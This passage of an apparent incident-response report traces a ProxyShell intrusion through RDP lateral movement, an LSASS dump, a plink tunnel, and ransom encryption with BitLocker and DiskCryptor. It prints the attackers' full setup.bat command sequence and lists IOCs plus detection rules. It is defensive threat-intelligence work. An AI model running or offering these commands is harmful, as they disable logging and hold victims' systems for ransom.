<p><a href="https://thedfirreport.com/wp-content/uploads/2021/11/b556b01c17c3d37d842bf28069b803b158c7662c1f1ae283804c70b53fbf5f41.png"><img loading="lazy" decoding="async" class="alignnone" title="enter image title here" src="https://thedfirreport.com/wp-content/uploads/2021/11/b556b01c17c3d37d842bf28069b803b158c7662c1f1ae283804c70b53fbf5f41.png" alt="Port Scanning" width="1602" height="603" /></a></p>
<h3 id="lateral-movement">Lateral Movement</h3>
<p>The threat actors mainly used Remote Desktop Services (RDP) to move laterally to other servers using the stolen domain admin account. Below is an extract focusing on RDP activity from patient 0:<br />
<a href="https://thedfirreport.com/wp-content/uploads/2021/11/b96c195d6f4439fa8c7856645e7f9f09f125d19354574f505970a66616f284f6.png"><img loading="lazy" decoding="async" class="alignnone" title="enter image title here" src="https://thedfirreport.com/wp-content/uploads/2021/11/b96c195d6f4439fa8c7856645e7f9f09f125d19354574f505970a66616f284f6.png" alt="RDP" width="1680" height="461" /></a></p>
<p>The threat actors also appeared to use Impacket&#8217;s wmiexec to perform lateral movement on one of the domain controllers.<br />
<a href="https://thedfirreport.com/wp-content/uploads/2021/11/a05c10b5fd69f6339dc74ae3d4c0aa6d829bb0b1b55e31747e50e9985b5b0995.png"><img loading="lazy" decoding="async" class="alignnone" title="enter image title here" src="https://thedfirreport.com/wp-content/uploads/2021/11/a05c10b5fd69f6339dc74ae3d4c0aa6d829bb0b1b55e31747e50e9985b5b0995.png" alt="Impacket" width="1368" height="357" /></a></p>
<p>We do not have a clear explanation for that behavior. However, we strongly believe that this was related to the deployment of the encryption script, as it happened just a few minutes before its manual execution on servers.</p>
<h3 id="collection">Collection</h3>
<p>No data collection was observed in this intrusion. The threat actors only collected the dumped LSASS using a zip archive:</p>
<pre><code>File created:
RuleName: -
UtcTime: REDACTED <span class="hljs-number">10</span>:<span class="hljs-number">40</span>:<span class="hljs-number">48.698</span>
ProcessGuid: {BF388D9C-AADF-<span class="hljs-number">614</span>D-A052-<span class="hljs-number">000000000700</span>}
ProcessId: <span class="hljs-number">17412</span>
Image: C:\Windows\Explorer.EXE
TargetFilename: C:\Users\DefaultAccount\AppData\Local\Temp\<span class="hljs-number">2</span>\lsass.zip
CreationUtcTime: REDACTED <span class="hljs-number">10</span>:<span class="hljs-number">40</span>:<span class="hljs-number">48.697</span></code></pre>
<h3 id="command-and-control">Command and Control</h3>
<p>No Command and Control frameworks were used during this intrusion. Initial access to the environment was performed using the web shell upon the exploitation of ProxyShell, then using valid accounts and Remote Desktop Services.</p>
<p>Threat actors created a SSH tunnel to 148.251.71[.]182 using <em>plink</em> in order to forward RDP access:<br />
<a href="https://thedfirreport.com/wp-content/uploads/2021/11/06cd805e9bdccced882075d49cfc8e6a51282897d54961934769e47c7515e417.png"><img loading="lazy" decoding="async" class="alignnone" title="enter image title here" src="https://thedfirreport.com/wp-content/uploads/2021/11/06cd805e9bdccced882075d49cfc8e6a51282897d54961934769e47c7515e417.png" alt="Plink" width="1887" height="177" /></a></p>
<p>Looking at this <a href="https://www.virustotal.com/gui/ip-address/148.251.71.182/relations" target="_blank" rel="nofollow noopener">IP address on VirusTotal</a>, we can observe that all &#8220;Communicating Files&#8221; related to it trigger FRP AV Signatures or Yara rules:<br />
<a href="https://thedfirreport.com/wp-content/uploads/2021/11/361b17b00609f43da0447cf3ea3d08098556075e4a0a8d9710a01bb31f3ae9e8.png"><img loading="lazy" decoding="async" class="alignnone" title="enter image title here" src="https://thedfirreport.com/wp-content/uploads/2021/11/361b17b00609f43da0447cf3ea3d08098556075e4a0a8d9710a01bb31f3ae9e8.png" alt="VT Relations" width="741" height="234" /></a><br />
We can conclude that those threat actors are used to this protocol tunneling technique.</p>
<h3 id="exfiltration">Exfiltration</h3>
<p>Except lsass.zip, no data exfiltration or staging have been observed during this intrusion.</p>
<h3 id="impact">Impact</h3>
<p>In this intrusion the threat actors used <a href="https://docs.microsoft.com/en-us/windows/security/information-protection/bitlocker/bitlocker-overview" target="_blank" rel="noopener">BitLocker</a> and an open source encrypter, <a href="https://github.com/DavidXanatos/DiskCryptor" target="_blank" rel="noopener">DiskCryptor,</a> in order to encrypt systems domain wide. On servers a batch script named setup.bat was used and on workstations the GUI application named dcrypt.exe(<a href="https://github.com/DavidXanatos/DiskCryptor" target="_blank" rel="noopener">DiskCryptor</a>) was executed instead. Both were executed via the threat actors after RDP login to each host.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2021/11/BitLocker-and-DiskCryptor-Ransom-Execution.png"><img loading="lazy" decoding="async" class="alignnone size-full wp-image-4650" src="https://thedfirreport.com/wp-content/uploads/2021/11/BitLocker-and-DiskCryptor-Ransom-Execution.png" alt="" width="1259" height="484" srcset="https://thedfirreport.com/wp-content/uploads/2021/11/BitLocker-and-DiskCryptor-Ransom-Execution.png 1259w, https://thedfirreport.com/wp-content/uploads/2021/11/BitLocker-and-DiskCryptor-Ransom-Execution-300x115.png 300w, https://thedfirreport.com/wp-content/uploads/2021/11/BitLocker-and-DiskCryptor-Ransom-Execution-1024x394.png 1024w, https://thedfirreport.com/wp-content/uploads/2021/11/BitLocker-and-DiskCryptor-Ransom-Execution-768x295.png 768w" sizes="auto, (max-width: 1259px) 100vw, 1259px" /></a></p>
<p>On servers they copied over a file named setup.bat.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2021/11/6898-1.png"><img loading="lazy" decoding="async" class="alignnone size-full wp-image-4580" src="https://thedfirreport.com/wp-content/uploads/2021/11/6898-1.png" alt="" width="417" height="176" srcset="https://thedfirreport.com/wp-content/uploads/2021/11/6898-1.png 417w, https://thedfirreport.com/wp-content/uploads/2021/11/6898-1-300x127.png 300w" sizes="auto, (max-width: 417px) 100vw, 417px" /></a></p>
<p>They then manually executed the script which disables the event log service, enables BitLocker (and RDP), prepares system drive using BdeHdCfg (a BitLocker drive encryption preparation tool), restarts the system, and deletes itself.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2021/11/6898-2.png"><img loading="lazy" decoding="async" class="alignnone size-full wp-image-4581" src="https://thedfirreport.com/wp-content/uploads/2021/11/6898-2.png" alt="" width="648" height="430" srcset="https://thedfirreport.com/wp-content/uploads/2021/11/6898-2.png 648w, https://thedfirreport.com/wp-content/uploads/2021/11/6898-2-300x199.png 300w" sizes="auto, (max-width: 648px) 100vw, 648px" /></a></p>
<p>Below are the commands executed by the script:</p>
<pre><code>net  <span class="hljs-operator"><span class="hljs-keyword">stop</span> eventlog /y
sc  config TermService  <span class="hljs-keyword">start</span>= <span class="hljs-keyword">auto</span>
reg  <span class="hljs-keyword">add</span> <span class="hljs-string">"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server"</span> /v TSEnabled /<span class="hljs-keyword">t</span> REG_DWORD /<span class="hljs-keyword">d</span> <span class="hljs-number">1</span> /<span class="hljs-keyword">f</span>
reg  <span class="hljs-keyword">add</span> <span class="hljs-string">"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server"</span> /v fDenyTSConnections /<span class="hljs-keyword">t</span> REG_DWORD /<span class="hljs-keyword">d</span> <span class="hljs-number">0</span> /<span class="hljs-keyword">f</span>
reg  <span class="hljs-keyword">add</span> <span class="hljs-string">"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp"</span> /v UserAuthentication /<span class="hljs-keyword">t</span> REG_DWORD /<span class="hljs-keyword">d</span> <span class="hljs-number">0</span> /<span class="hljs-keyword">f</span>
netsh  advfirewall firewall <span class="hljs-keyword">add</span> rule <span class="hljs-keyword">name</span>=<span class="hljs-string">"Terminal Server"</span> dir=<span class="hljs-keyword">in</span> <span class="hljs-keyword">action</span>=<span class="hljs-keyword">allow</span> protocol=TCP localport=<span class="hljs-number">3389</span>
net  <span class="hljs-keyword">start</span> TermService
REG  <span class="hljs-keyword">ADD</span> HKLM\SOFTWARE\Policies\Microsoft\FVE /v EnableBDEWithNoTPM /<span class="hljs-keyword">t</span> REG_DWORD /<span class="hljs-keyword">d</span> <span class="hljs-number">1</span> /<span class="hljs-keyword">f</span>
REG  <span class="hljs-keyword">ADD</span> HKLM\SOFTWARE\Policies\Microsoft\FVE /v UseAdvancedStartup /<span class="hljs-keyword">t</span> REG_DWORD /<span class="hljs-keyword">d</span> <span class="hljs-number">1</span> /<span class="hljs-keyword">f</span>
REG  <span class="hljs-keyword">ADD</span> HKLM\SOFTWARE\Policies\Microsoft\FVE /v UseTPM /<span class="hljs-keyword">t</span> REG_DWORD /<span class="hljs-keyword">d</span> <span class="hljs-number">2</span> /<span class="hljs-keyword">f</span>
REG  <span class="hljs-keyword">ADD</span> HKLM\SOFTWARE\Policies\Microsoft\FVE /v UseTPMKey /<span class="hljs-keyword">t</span> REG_DWORD /<span class="hljs-keyword">d</span> <span class="hljs-number">2</span> /<span class="hljs-keyword">f</span>
REG  <span class="hljs-keyword">ADD</span> HKLM\SOFTWARE\Policies\Microsoft\FVE /v UseTPMKeyPIN /<span class="hljs-keyword">t</span> REG_DWORD /<span class="hljs-keyword">d</span> <span class="hljs-number">2</span> /<span class="hljs-keyword">f</span>
REG  <span class="hljs-keyword">ADD</span> HKLM\SOFTWARE\Policies\Microsoft\FVE /V RecoveryKeyMessageSource /<span class="hljs-keyword">t</span> REG_DWORD /<span class="hljs-keyword">d</span> <span class="hljs-number">2</span> /<span class="hljs-keyword">f</span>
REG  <span class="hljs-keyword">ADD</span> HKLM\SOFTWARE\Policies\Microsoft\FVE /v UseTPMPIN /<span class="hljs-keyword">t</span> REG_DWORD /<span class="hljs-keyword">d</span> <span class="hljs-number">2</span> /<span class="hljs-keyword">f</span>
REG  <span class="hljs-keyword">ADD</span> HKLM\SOFTWARE\Policies\Microsoft\FVE /v RecoveryKeyMessage /<span class="hljs-keyword">t</span> REG_SZ /<span class="hljs-keyword">d</span> <span class="hljs-string">" +-+-+- Your drives are Encrypted! Contact us immediately: <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="dd8f98999c9e8998999db2b3b4b2b3b0bcb4b1f3b2afba">[email&#160;protected]</a> -+-+-+"</span> /<span class="hljs-keyword">f</span>
powershell  -<span class="hljs-keyword">c</span> <span class="hljs-string">"Import-Module ServerManager; ADD-WindowsFeature BitLocker -Restart"</span>
powershell  -<span class="hljs-keyword">c</span> <span class="hljs-string">"Install-WindowsFeature BitLocker ΓÇôIncludeAllSubFeature -IncludeManagementTools -Restart"</span>
powershell  -<span class="hljs-keyword">c</span> <span class="hljs-string">"Initialize-Tpm -AllowClear -AllowPhysicalPresence -ErrorAction SilentlyContinue"</span>
powershell  -<span class="hljs-keyword">c</span> <span class="hljs-string">"Get-Service -Name defragsvc -ErrorAction SilentlyContinue | Set-Service -Status Running -ErrorAction SilentlyContinue"</span>
powershell  -<span class="hljs-keyword">c</span> <span class="hljs-string">"BdeHdCfg -target $env:SystemDrive shrink -quiet -restart"</span>
sc  config eventlog <span class="hljs-keyword">start</span>= <span class="hljs-keyword">auto</span>
cmd  /<span class="hljs-keyword">c</span> del <span class="hljs-string">"C:\Windows\setup.bat"</span>
cmd  /<span class="hljs-keyword">c</span> del <span class="hljs-string">"C:\Users\REDACTED\Desktop\setup.bat"</span></span></code></pre>
<p>Running this script on servers made them inaccessible, and the following BitLocker encryption message was shown when restarted:<br />
<a href="https://thedfirreport.com/wp-content/uploads/2021/11/2c43c4d94e2b7375ec689e5963cd8ca6612ff15fa7b81f3cae6c77c18a94ac44.png"><img loading="lazy" decoding="async" class="alignnone" title="enter image title here" src="https://thedfirreport.com/wp-content/uploads/2021/11/2c43c4d94e2b7375ec689e5963cd8ca6612ff15fa7b81f3cae6c77c18a94ac44.png" alt="Bitlocker" width="850" height="649" /></a></p>
<p>A binary called dcrypt.exe, was dropped on a backup server and immediately deleted. While this utility was not executed on any servers in the environment it was deployed to all the workstations.</p>
<p><img loading="lazy" decoding="async" class="alignnone size-full wp-image-4596" src="https://thedfirreport.com/wp-content/uploads/2021/11/1-6.png" alt="" width="866" height="448" srcset="https://thedfirreport.com/wp-content/uploads/2021/11/1-6.png 866w, https://thedfirreport.com/wp-content/uploads/2021/11/1-6-300x155.png 300w, https://thedfirreport.com/wp-content/uploads/2021/11/1-6-768x397.png 768w" sizes="auto, (max-width: 866px) 100vw, 866px" /></p>
<p>The executable used is the <a href="https://github.com/DavidXanatos/DiskCryptor/releases/tag/v1.2.3" target="_blank" rel="noopener">current release</a> of the installer for the utility DiskCryptor.</p>
<p>We are unsure why DiskCrypter was used on workstations but we believe it may have something to do with not all workstation versions supporting BitLocker.</p>
<p><img loading="lazy" decoding="async" class="alignnone size-full wp-image-4597" src="https://thedfirreport.com/wp-content/uploads/2021/11/2.png" alt="" width="440" height="126" srcset="https://thedfirreport.com/wp-content/uploads/2021/11/2.png 440w, https://thedfirreport.com/wp-content/uploads/2021/11/2-300x86.png 300w" sizes="auto, (max-width: 440px) 100vw, 440px" /></p>
<p><a href="https://en.wikipedia.org/wiki/BitLocker" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/BitLocker</a></p>
<p>Use of this utility on workstations ensures a reliable encryption without the need to develop their own ransomware or get into a ransomware as a service affiliate program.</p>
<p>This executable, however, reminds you on install that it is &#8220;beta&#8221; software.</p>
<p><img loading="lazy" decoding="async" class="alignnone size-full wp-image-4589" src="https://thedfirreport.com/wp-content/uploads/2021/11/1-3.png" alt="" width="397" height="143" srcset="https://thedfirreport.com/wp-content/uploads/2021/11/1-3.png 397w, https://thedfirreport.com/wp-content/uploads/2021/11/1-3-300x108.png 300w" sizes="auto, (max-width: 397px) 100vw, 397px" /></p>
<p>The setup process then works as most windows installers and requires a reboot of the system. During installation a kernel mode driver is added to support the encryption process.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2021/11/6898-7.png"><img loading="lazy" decoding="async" class="alignnone size-full wp-image-4584" src="https://thedfirreport.com/wp-content/uploads/2021/11/6898-7.png" alt="" width="442" height="148" srcset="https://thedfirreport.com/wp-content/uploads/2021/11/6898-7.png 442w, https://thedfirreport.com/wp-content/uploads/2021/11/6898-7-300x100.png 300w" sizes="auto, (max-width: 442px) 100vw, 442px" /></a></p>
<p>After reboot, the program GUI allows you to configure the encryption options.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2021/11/6898-5.png"><img loading="lazy" decoding="async" class="alignnone size-full wp-image-4585" src="https://thedfirreport.com/wp-content/uploads/2021/11/6898-5.png" alt="" width="626" height="657" srcset="https://thedfirreport.com/wp-content/uploads/2021/11/6898-5.png 626w, https://thedfirreport.com/wp-content/uploads/2021/11/6898-5-286x300.png 286w" sizes="auto, (max-width: 626px) 100vw, 626px" /></a></p>
<div class="markdown">
<p>After encryption completed, the systems were rebooted and left with the following screen:</p>
<p><img loading="lazy" decoding="async" class="alignnone size-full wp-image-4590" src="https://thedfirreport.com/wp-content/uploads/2021/11/1-4.png" alt="" width="778" height="467" srcset="https://thedfirreport.com/wp-content/uploads/2021/11/1-4.png 778w, https://thedfirreport.com/wp-content/uploads/2021/11/1-4-300x180.png 300w, https://thedfirreport.com/wp-content/uploads/2021/11/1-4-768x461.png 768w" sizes="auto, (max-width: 778px) 100vw, 778px" /></p>
<p>The threat actors left their note requesting 8,000 USD on a domain controller which was not rebooted or locked out. The note pointed to Telegram and ProtonMail contacts</p>
<hr />
<p><a href="https://thedfirreport.com/wp-content/uploads/2021/11/6898ransom.png"><img loading="lazy" decoding="async" class="alignnone" title="enter image title here" src="https://thedfirreport.com/wp-content/uploads/2021/11/6898ransom.png" alt="Ransom note" width="858" height="487" /></a></p>
<hr />
</div>
<div class="markdown">
<h2 id="iocs">IOCs</h2>
<p>All artifacts including web shells, files, IPs, etc were added to our <a href="https://thedfirreport.com/services/" target="_blank" rel="noopener">servers</a> in September.</p>
<h3 id="network">Network</h3>
<pre><code><span class="hljs-number">Plink
148.251</span><span class="hljs-number">.71</span><span class="hljs-number">.182 
tcp.symantecserver.co
</span>
dllhost.exe connected to the following IPs over 443
<span class="hljs-number">18.221</span><span class="hljs-number">.115</span><span class="hljs-number">.241</span>
<span class="hljs-number">217.23</span><span class="hljs-number">.5</span><span class="hljs-number">.42</span>
<span class="hljs-number">37.139</span><span class="hljs-number">.3</span><span class="hljs-number">.208
148.251.71.182
</span>
Connected to aspx_gtonvbgidhh.aspx
<span class="hljs-number">198.144</span><span class="hljs-number">.189</span><span class="hljs-number">.74</span>
<span class="hljs-number">86.57</span><span class="hljs-number">.38</span><span class="hljs-number">.156</span></code></pre>
<h3 id="file">File</h3>
<pre><code>- dcrypt.exe
   - md5: <span class="hljs-number">3375f</span>e67827671e121d049f9aabefc3e
   - SHA1: e5286dbd0a54a110b39eb1e3e7015d82f316132e
   - SHA256: <span class="hljs-number">02</span>ac3a4f1cfb2723c20f3c7678b62c340c7974b95f8d9320941641d5c6fd2fee
- dllhost.exe
   - md5: d4a55e486f5e28168bc4554cffa64ea0
   - SHA1: <span class="hljs-number">49</span>c222afbe9c610fa75ffbbfb454728e608c8b57
   - SHA256: e3eac25c3beb77ffed609c53b447a81ec8a0e20fb94a6442a51d72ca9e6f7cd2
- login.aspx
   - md5: <span class="hljs-number">7</span>c2b567b659246d2b278da500daa9abe
   - SHA1: <span class="hljs-number">83</span>d21bb502b73016ec0ad7d6c725d71aaffa0f6d
   - SHA256: <span class="hljs-number">98</span>ccde0e1a5e6c7071623b8b294df53d8e750ff2fa22070b19a88faeaa3d32b0
- aspx_gtonvbgidhh.aspx
   - md5: <span class="hljs-number">34623</span>dc70d274157dbc6e08b21154a3f
   - SHA1: <span class="hljs-number">3664e6</span>e27fb2784f44f6dba6105ac8b90793032a
   - SHA256: dc4186dd9b3a4af8565f87a9a799644fce8af25e3ee8777d90ae660d48497a04
- aspx_qdajscizfzx.aspx
   - md5: <span class="hljs-number">31f</span>05b4ee52f0512c96d0cc6f158e083
   - SHA1: ef949770ae46bb58918b0fe127bec0ec300b18a9
   - SHA256: <span class="hljs-number">60</span>d22223625c86d7f3deb20f41aec40bc8e1df3ab02cf379d95554df05edf55c
</code></pre>
<h2 id="detections">Detections</h2>
<h3 id="network">Network</h3>
<pre><code><span class="hljs-title">ET</span> INFO User-Agent (python-requests) Inbound to Webserver
</code></pre>
<pre>alert tcp any any -&gt; [$HOME_NET,$HTTP_SERVERS] [443,444] (msg:"ET EXPLOIT Possible Microsoft Exchange RCE Inbound M2 (CVE-2021-34473)"; flow:established,to_server; content:"POST"; http_method; content:"/autodiscover.json?"; http_uri; content:"/PowerShell/"; distance:0; http_uri; content:"&amp;X-Rps-CAT="; distance:0; fast_pattern; http_uri; content:"&amp;Email="; distance:0; http_uri; content:"autodiscover/"; distance:0; within:20; http_uri; reference:cve,2021-34473; classtype:attempted-admin; sid:2033711; rev:1; metadata:affected_product MS_Exchange, attack_target Server, created_at 2021_08_12, cve CVE_2021_34473, deployment Perimeter, deployment Internal, former_category EXPLOIT, signature_severity Major, tag Exploit, updated_at 2021_08_12;)
alert tcp any any -&gt; [$HOME_NET,$HTTP_SERVERS] [443,444] (msg:"ET EXPLOIT Possible Microsoft Exchange RCE with Python PSRP Client UA Inbound (CVE-2021-34473)"; flow:established,to_server; content:"POST"; http_method; content:"/autodiscover/autodiscover.json?"; http_uri; content:"Python|20|PSRP|20|Client"; fast_pattern; http_header; pcre:"/^User-Agent\x3a\x20[^\r\n]+Python\x20PSRP\x20Client/Hmi"; reference:cve,2021-34473; classtype:attempted-admin; sid:2033712; rev:1; metadata:affected_product MS_Exchange, attack_target Server, created_at 2021_08_12, cve CVE_2021_34473, deployment Perimeter, deployment Internal, former_category EXPLOIT, signature_severity Major, tag Exploit, updated_at 2021_08_12;)
alert tcp any any -&gt; [$HOME_NET,$HTTP_SERVERS] [443,444] (msg:"ET EXPLOIT Possible Microsoft Exchange RCE Inbound M1 (CVE-2021-34473)"; flow:established,to_server; content:"POST"; http_method; content:"/ews/exchange.asmx"; fast_pattern; http_uri; content:"&lt;s"; http_client_body; content:"SerializedSecurityContext&gt;"; distance:0; http_client_body; content:"Message&gt;"; distance:0; http_client_body; content:"Attachments&gt;"; distance:0; http_client_body; content:"Content&gt;"; distance:0; http_client_body; content:"|60 c2 ac c2 aa|"; distance:0; within:200; http_client_body; reference:cve,2021-34473; classtype:attempted-admin; sid:2033684; rev:3; metadata:affected_product MS_Exchange, attack_target Server, created_at 2021_08_09, cve CVE_2021_34473, deployment Perimeter, deployment Internal, deployment SSLDecrypt, former_category EXPLOIT, signature_severity Major, tag Exploit, updated_at 2021_08_12;)
alert tcp any any -&gt; [$HOME_NET,$HTTP_SERVERS] any (msg:"ET EXPLOIT Microsoft Exchange Pre-Auth Path Confusion M2 (CVE-2021-31207)"; flow:established,to_server; content:"/autodiscover?"; nocase; http_uri; content:"/mapi/nspi"; nocase; distance:0; fast_pattern; http_uri; content:"Email=autodiscover/"; nocase; http_cookie; flowbits:set,ET.cve.2021.34473; reference:cve,2021-31207; classtype:attempted-admin; sid:2033682; rev:2; metadata:affected_product MS_Exchange, attack_target Server, created_at 2021_08_09, cve CVE_2021_31207, deployment Perimeter, deployment Internal, deployment SSLDecrypt, former_category EXPLOIT, signature_severity Major, tag Exploit, updated_at 2021_08_09;)
alert tcp [$HOME_NET,$HTTP_SERVERS] any -&gt; any any (msg:"ET EXPLOIT Vulnerable Microsoft Exchange Server Response (CVE-2021-31207)"; flow:established,from_server; flowbits:isset,ET.cve.2021.34473; content:"302"; http_stat_code; reference:cve,2021-31207; classtype:attempted-admin; sid:2033683; rev:1; metadata:affected_product MS_Exchange, attack_target Server, created_at 2021_08_09, cve CVE_2021_31207, deployment Perimeter, deployment Internal, former_category EXPLOIT, signature_severity Major, tag Exploit, updated_at 2021_08_09;)
alert tcp any any -&gt; [$HOME_NET,$HTTP_SERVERS] [443,444] (msg:"ET EXPLOIT Microsoft Exchange SUID Disclosure via SSRF Inbound (CVE-2021-31207)"; flow:established,to_server; content:"/autodiscover?"; nocase; http_uri; content:"Email=autodiscover/"; nocase; http_uri; content:"/mapi/emsmdb"; nocase; distance:0; fast_pattern; http_uri; reference:cve,2021-31207; classtype:attempted-admin; sid:2033701; rev:2; metadata:affected_product MS_Exchange, attack_target Server, created_at 2021_08_10, cve CVE_2021_31207, deployment Perimeter, deployment Internal, former_category EXPLOIT, signature_severity Major, tag Exploit, updated_at 2021_08_10;)
alert tcp any any -&gt; [$HOME_NET,$HTTP_SERVERS] any (msg:"ET EXPLOIT Microsoft Exchange Pre-Auth Path Confusion M1 (CVE-2021-31207)"; flow:established,to_server; content:"/autodiscover?"; nocase; http_uri; fast_pattern; content:"Email=autodiscover/"; nocase; http_uri; flowbits:set,ET.cve.2021.34473; reference:cve,2021-31207; classtype:attempted-admin; sid:2033681; rev:3; metadata:affected_product MS_Exchange, attack_target Server, created_at 2021_08_09, cve CVE_2021_31207, deployment Perimeter, deployment Internal, deployment SSLDecrypt, former_category EXPLOIT, signature_severity Major, tag Exploit, updated_at 2021_08_12;)
alert tcp any any -&gt; [$HOME_NET,$HTTP_SERVERS] [443,444] (msg:"ET EXPLOIT Possible Microsoft Exchange RCE Inbound M2 (CVE-2021-34473)"; flow:established,to_server; content:"POST"; http_method; content:"/autodiscover.json?"; http_uri; content:"/PowerShell/"; distance:0; http_uri; content:"&amp;X-Rps-CAT="; distance:0; fast_pattern; http_uri; content:"&amp;Email="; distance:0; http_uri; content:"autodiscover/"; distance:0; within:20; http_uri; reference:cve,2021-34473; classtype:attempted-admin; sid:2033711; rev:1; metadata:affected_product MS_Exchange, attack_target Server, created_at 2021_08_12, cve CVE_2021_34473, deployment Perimeter, deployment Internal, former_category EXPLOIT, signature_severity Major, tag Exploit, updated_at 2021_08_12;)
alert tcp any any -&gt; [$HOME_NET,$HTTP_SERVERS] [443,444] (msg:"ET EXPLOIT Possible Microsoft Exchange RCE with Python PSRP Client UA Inbound (CVE-2021-34473)"; flow:established,to_server; content:"POST"; http_method; content:"/autodiscover/autodiscover.json?"; http_uri; content:"Python|20|PSRP|20|Client"; fast_pattern; http_header; pcre:"/^User-Agent\x3a\x20[^\r\n]+Python\x20PSRP\x20Client/Hmi"; reference:cve,2021-34473; classtype:attempted-admin; sid:2033712; rev:1; metadata:affected_product MS_Exchange, attack_target Server, created_at 2021_08_12, cve CVE_2021_34473, deployment Perimeter, deployment Internal, former_category EXPLOIT, signature_severity Major, tag Exploit, updated_at 2021_08_12;)
alert tcp any any -&gt; [$HOME_NET,$HTTP_SERVERS] [443,444] (msg:"ET EXPLOIT Possible Microsoft Exchange RCE Inbound M1 (CVE-2021-34473)"; flow:established,to_server; content:"POST"; http_method; content:"/ews/exchange.asmx"; fast_pattern; http_uri; content:"&lt;s"; http_client_body; content:"SerializedSecurityContext&gt;"; distance:0; http_client_body; content:"Message&gt;"; distance:0; http_client_body; content:"Attachments&gt;"; distance:0; http_client_body; content:"Content&gt;"; distance:0; http_client_body; content:"|60 c2 ac c2 aa|"; distance:0; within:200; http_client_body; reference:cve,2021-34473; classtype:attempted-admin; sid:2033684; rev:3; metadata:affected_product MS_Exchange, attack_target Server, created_at 2021_08_09, cve CVE_2021_34473, deployment Perimeter, deployment Internal, deployment SSLDecrypt, former_category EXPLOIT, signature_severity Major, tag Exploit, updated_at 2021_08_12;)
alert tcp any any -&gt; [$HOME_NET,$HTTP_SERVERS] any (msg:"ET EXPLOIT Microsoft Exchange Pre-Auth Path Confusion M2 (CVE-2021-31207)"; flow:established,to_server; content:"/autodiscover?"; nocase; http_uri; content:"/mapi/nspi"; nocase; distance:0; fast_pattern; http_uri; content:"Email=autodiscover/"; nocase; http_cookie; flowbits:set,ET.cve.2021.34473; reference:cve,2021-31207; classtype:attempted-admin; sid:2033682; rev:2; metadata:affected_product MS_Exchange, attack_target Server, created_at 2021_08_09, cve CVE_2021_31207, deployment Perimeter, deployment Internal, deployment SSLDecrypt, former_category EXPLOIT, signature_severity Major, tag Exploit, updated_at 2021_08_09;)
alert tcp [$HOME_NET,$HTTP_SERVERS] any -&gt; any any (msg:"ET EXPLOIT Vulnerable Microsoft Exchange Server Response (CVE-2021-31207)"; flow:established,from_server; flowbits:isset,ET.cve.2021.34473; content:"302"; http_stat_code; reference:cve,2021-31207; classtype:attempted-admin; sid:2033683; rev:1; metadata:affected_product MS_Exchange, attack_target Server, created_at 2021_08_09, cve CVE_2021_31207, deployment Perimeter, deployment Internal, former_category EXPLOIT, signature_severity Major, tag Exploit, updated_at 2021_08_09;)
alert tcp any any -&gt; [$HOME_NET,$HTTP_SERVERS] [443,444] (msg:"ET EXPLOIT Microsoft Exchange SUID Disclosure via SSRF Inbound (CVE-2021-31207)"; flow:established,to_server; content:"/autodiscover?"; nocase; http_uri; content:"Email=autodiscover/"; nocase; http_uri; content:"/mapi/emsmdb"; nocase; distance:0; fast_pattern; http_uri; reference:cve,2021-31207; classtype:attempted-admin; sid:2033701; rev:2; metadata:affected_product MS_Exchange, attack_target Server, created_at 2021_08_10, cve CVE_2021_31207, deployment Perimeter, deployment Internal, former_category EXPLOIT, signature_severity Major, tag Exploit, updated_at 2021_08_10;)
alert tcp any any -&gt; [$HOME_NET,$HTTP_SERVERS] any (msg:"ET EXPLOIT Microsoft Exchange Pre-Auth Path Confusion M1 (CVE-2021-31207)"; flow:established,to_server; content:"/autodiscover?"; nocase; http_uri; fast_pattern; content:"Email=autodiscover/"; nocase; http_uri; flowbits:set,ET.cve.2021.34473; reference:cve,2021-31207; classtype:attempted-admin; sid:2033681; rev:3; metadata:affected_product MS_Exchange, attack_target Server, created_at 2021_08_09, cve CVE_2021_31207, deployment Perimeter, deployment Internal, deployment SSLDecrypt, former_category EXPLOIT, signature_severity Major, tag Exploit, updated_at 2021_08_12;)</pre>
<h3 id="sigma">Sigma</h3>
<ul>
<li><a href="https://github.com/SigmaHQ/sigma/blob/59000b993d6280d9bf063eefdcdf30ea0e83aa5e/rules/windows/process_creation/win_susp_schtask_creation.yml" target="_blank" rel="nofollow noopener">Scheduled Task Creation</a></li>
<li><a href="https://github.com/SigmaHQ/sigma/blob/08ca62cc8860f4660e945805d0dd615ce75258c1/rules/windows/process_creation/win_webshell_detection.yml" target="_blank" rel="nofollow noopener">Webshell Detection With Command Line Keywords</a></li>
<li><a href="https://github.com/SigmaHQ/sigma/blob/08ca62cc8860f4660e945805d0dd615ce75258c1/rules/windows/process_creation/win_system_exe_anomaly.yml" target="_blank" rel="nofollow noopener">System File Execution Location Anomaly</a></li>
<li><a href="https://github.com/SigmaHQ/sigma/blob/a936f1afb78f14c3ecabc689bd283f58df21f328/rules/windows/file_event/sysmon_creation_system_file.yml" target="_blank" rel="nofollow noopener">File Created with System Process Name</a></li>
<li><a href="https://github.com/SigmaHQ/sigma/blob/08ca62cc8860f4660e945805d0dd615ce75258c1/rules/windows/process_creation/win_exfiltration_and_tunneling_tools_execution.yml" target="_blank" rel="nofollow noopener">Exfiltration and Tunneling Tools Execution</a></li>
<li><a href="https://github.com/SigmaHQ/sigma/blob/08ca62cc8860f4660e945805d0dd615ce75258c1/rules/windows/process_creation/sysmon_susp_plink_remote_forward.yml" target="_blank" rel="nofollow noopener">Suspicious Plink Remote Forwarding</a></li>
<li><a href="https://github.com/SigmaHQ/sigma/blob/08ca62cc8860f4660e945805d0dd615ce75258c1/rules/windows/process_creation/win_impacket_lateralization.yml" target="_blank" rel="nofollow noopener">Impacket Lateralization Detection</a></li>
<li><a href="https://github.com/SigmaHQ/sigma/blob/f36b1cbd2a3f1a7423f43a67a182549778700615/rules/windows/file_event/sysmon_lsass_memory_dump_file_creation.yml" target="_blank" rel="noopener"><span class="pl-s">LSASS Memory Dump File Creation</span></a></li>
</ul>
<h3 id="yara">Yara</h3>
<pre>Valhalla/Loki Yara Sigs

WEBSHELL_ASPX_ProxyShell_Aug21_2
